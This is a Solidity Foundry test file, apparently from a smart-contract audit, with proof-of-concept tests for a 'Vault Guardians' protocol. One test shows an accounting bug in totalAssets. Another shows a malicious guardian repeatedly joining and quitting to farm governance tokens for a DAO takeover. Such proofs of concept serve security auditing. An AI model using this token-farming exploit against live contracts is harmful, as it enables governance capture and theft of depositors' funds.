// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {VaultSharesTest} from "../../test/unit/concrete/VaultSharesTest.t.sol";
import {VaultGuardiansBaseTest} from "./unit/concrete/VaultGuardiansBaseTest.t.sol";
import {VaultShares, IERC20} from "../src/protocol/VaultShares.sol";
import {VaultGuardianGovernor} from "../src/dao/VaultGuardianGovernor.sol";
import {VaultGuardianToken} from "../src/dao/VaultGuardianToken.sol";

contract ProofOfCodes is VaultSharesTest {
    function testWrongBalance() public {
        // Mint 100 ETH
        weth.mint(mintAmount, guardian);
        vm.startPrank(guardian);
        weth.approve(address(vaultGuardians), mintAmount);
        address wethVault = vaultGuardians.becomeGuardian(allocationData);
        wethVaultShares = VaultShares(wethVault);
        vm.stopPrank();

        // prints 3.75 ETH
        console.log(wethVaultShares.totalAssets());

        // Mint another 100 ETH
        weth.mint(mintAmount, user);
        vm.startPrank(user);
        weth.approve(address(wethVaultShares), mintAmount);
        wethVaultShares.deposit(mintAmount, user);
        vm.stopPrank();

        // prints 41.25 ETH
        console.log(wethVaultShares.totalAssets());
    }
}

contract DaoTakeOver is VaultGuardiansBaseTest {
    bytes[] functionCalls;
    address[] addressesToCall;
    uint256[] values;

    function testDaoTakeover() public hasGuardian hasTokenGuardian {
        address maliciousGuardian = makeAddr("maliciousGuardian");
        uint256 startingVoterUsdcBalance = usdc.balanceOf(maliciousGuardian);
        uint256 startingVoterWethBalance = weth.balanceOf(maliciousGuardian);
        assertEq(startingVoterUsdcBalance, 0);
        assertEq(startingVoterWethBalance, 0);

        // 0. Flash loan the tokens, or just buy a bunch for 1 block
        VaultGuardianGovernor governor = VaultGuardianGovernor(payable(vaultGuardians.owner()));
        VaultGuardianToken vgToken = VaultGuardianToken(address(governor.token()));

        // Malicious Guardian farms tokens
        weth.mint(mintAmount, maliciousGuardian); // The same amount as the other guardians
        uint256 startingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
        uint256 startingRegularVGTokenBalance = vgToken.balanceOf(guardian);
        console.log("Malicious VGToken Balance:", startingMaliciousVGTokenBalance);
        console.log("Regular VGToken Balance:", startingRegularVGTokenBalance);

        vm.startPrank(maliciousGuardian);
        for (uint256 i; i < 10; i++) {
            weth.approve(address(vaultGuardians), weth.balanceOf(maliciousGuardian));
            address maliciousWethSharesVault = vaultGuardians.becomeGuardian(allocationData);
            IERC20(maliciousWethSharesVault).approve(
                address(vaultGuardians), IERC20(maliciousWethSharesVault).balanceOf(maliciousGuardian)
            );
            vaultGuardians.quitGuardian();
        }
        vm.stopPrank();

        uint256 endingMaliciousVGTokenBalance = vgToken.balanceOf(maliciousGuardian);
        uint256 endingRegularVGTokenBalance = vgToken.balanceOf(guardian);
        console.log("Malicious VGToken Balance:", endingMaliciousVGTokenBalance);
        console.log("Regular VGToken Balance:", endingRegularVGTokenBalance);
    }
}
